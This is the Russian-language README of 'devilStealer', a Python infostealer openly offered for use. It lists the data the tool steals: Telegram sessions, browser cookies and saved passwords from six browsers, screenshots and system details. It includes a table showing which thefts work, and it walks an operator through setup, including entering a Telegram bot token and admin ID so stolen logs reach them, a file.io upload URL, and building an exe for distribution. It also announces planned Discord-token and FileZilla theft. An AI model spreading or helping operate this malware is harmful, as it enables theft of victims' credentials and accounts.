# devilStealer
### Python стиллер с отправкой через Telegram бота
### Какие данные ворует стиллер
- Телеграмм сессия
- Куки с Chrome
- Куки с Firefox
- Куки с Opera
- Куки с Yandex
- Куки с Amigo
- Куки с Edge

- Пароли с Chrome
- Пароли с Firefox
- Пароли с Opera
- Пароли с Yandex
- Пароли с Amigo
- Пароли с Edge
  
- Снимок экрана компьютера
- Информация о ПК
  - Время запуска стиллера
  - Имя пользователя/компьютера
  - IP
  - MAC адрес
  - Hostname
  - Информация о сетевых подключениях
  - Найденные программы стиллером
  - Информация о CPU
  - Информация о GPU
  - Информация о оперативной памяти
  - Информация о дисках
  - Информация об ОС
**Данные которые ворует стиллер могут обновляться**

### Последний тест стиллера
**Версия python на которой проводились тесты: 3.11**

**Версия библиотек на которых проводились тесты:
Pillow 10.0.0
browser-cookie3 0.19.1
psutil 5.9.5
pywin32 306
pyTelegramBotAPI 4.13.0**
| Данные | Дата последнего теста | Работает |
| ----------- | ----------- | ----------- |
| Куки с Chrome    | 28.08.2023   | Да   |
| Куки с Firefox    | 27.08.2023   | Да   |
| Куки с Opera    | 27.08.2023   | Да   |
| Куки с Yandex    | 28.08.2023   | Да   |
| Куки с Amigo    | -   | ?   |
| Куки с Edge    | 27.08.2023   | Да   |
| Пароли с Chrome    | 28.08.2023   | Да   |
| Пароли с Firefox    | 28.08.2023   | Да   |
| Пароли с Opera    | 27.08.2023   | Да   |
| Пароли с Yandex    | 28.08.2023   | Да   |
| Пароли с Amigo    | -   | ?   |
| Пароли с Edge    | 28.08.2023   | Да   |
| Сессия Telegram    | 28.08.2023   | Да   |
| Снимок экрана    | 28.08.2023   | Да   |
| Информация о ПК    | 28.08.2023   | Да   |

### Как установить
#### Windows
**Установка библиотек**

```
pip install Pillow
pip install browser-cookie3
pip install psutil
pip install pywin32
pip install pyTelegramBotAPI
```

**После установки библиотек скачайте и откройте архив с данным репозиторием**

**Отредактируйте bot.py**

Измените ADMIN_ID на ваш айди телеграмма (Получить можно в боте @chatIDrobot)


Измените bot = telebot.Telebot("СЮДА ТОКЕН ВАШЕГО БОТА") (Создать бота можно в @BotFather)

```
ADMIN_ID = "ID" # Your telegram id
FILE_IO_API_URL = "https://file.io"

bot = telebot.TeleBot("TOKEN") # Your bot token
```

**Если вы хотите другой путь на сохранение временных файлов стиллера то отредактируйте stealer.py**

```
FILE_PATH = fr"C:\Users\{os.getlogin()}\AppData\Roaming\DevilStealerData"
FILE_COOKIE = fr"C:\Users\{os.getlogin()}\AppData\Roaming\DevilStealerData\cookie"
FILE_PASSWORDS = fr"C:\Users\{os.getlogin()}\AppData\Roaming\DevilStealerData\passwords"
FILE_TG = fr"C:\Users\{os.getlogin()}\AppData\Roaming\DevilStealerData\tdata"
SCREENSHOT_PATH = fr"C:\Users\{os.getlogin()}\AppData\Roaming\DevilStealerDatascreenshot.jpg"
ZIP_PATH = fr"C:\Users\{os.getlogin()}\AppData\Roaming"
```

**!!!ВНИМАНИЕ ПУТЬ АРХИВА НЕ ДОЛЖЕН БЫТЬ В ПАПКЕ ДАННЫХ (FILE_PATH путь до этой папки и других констант) СТИЛЛЕРА!!!**

**Фаил для запуска bot.py**

**Чтобы сбилдить стиллер в exe используйте nuitka или pyinstaller**

#### MAC OS / Linux
**Установка библиотек**

```
pip3 install Pillow
pip3 install browser-cookie3
pip3 install psutil
pip3 install pywin32
pip3 install pyTelegramBotAPI
```

**После установки библиотек скачайте и откройте архив с данным репозиторием**

**Отредактируйте bot.py**

Измените ADMIN_ID на ваш айди телеграмма (Получить можно в боте @chatIDrobot)


Измените bot = telebot.Telebot("СЮДА ТОКЕН ВАШЕГО БОТА") (Создать бота можно в @BotFather)

```
ADMIN_ID = "ID" # Your telegram id
FILE_IO_API_URL = "https://file.io"

bot = telebot.TeleBot("TOKEN") # Your bot token
```

**Если вы хотите другой путь на сохранение временных файлов стиллера то отредактируйте stealer.py**

```
FILE_PATH = fr"C:\Users\{os.getlogin()}\AppData\Roaming\DevilStealerData"
FILE_COOKIE = fr"C:\Users\{os.getlogin()}\AppData\Roaming\DevilStealerData\cookie"
FILE_PASSWORDS = fr"C:\Users\{os.getlogin()}\AppData\Roaming\DevilStealerData\passwords"
FILE_TG = fr"C:\Users\{os.getlogin()}\AppData\Roaming\DevilStealerData\tdata"
SCREENSHOT_PATH = fr"C:\Users\{os.getlogin()}\AppData\Roaming\DevilStealerDatascreenshot.jpg"
ZIP_PATH = fr"C:\Users\{os.getlogin()}\AppData\Roaming"
```

**!!!ВНИМАНИЕ ПУТЬ АРХИВА НЕ ДОЛЖЕН БЫТЬ В ПАПКЕ ДАННЫХ (FILE_PATH путь до этой папки и других констант) СТИЛЛЕРА!!!**

**Фаил для запуска bot.py**

**Чтобы сбилдить стиллер в exe используйте nuitka или pyinstaller**

### Скоро будет
1. Получение куки и пароли с других браузеров
2. Получение данных с FileZilla
3. Получение токена Discord
4. Другие способы отправки логов
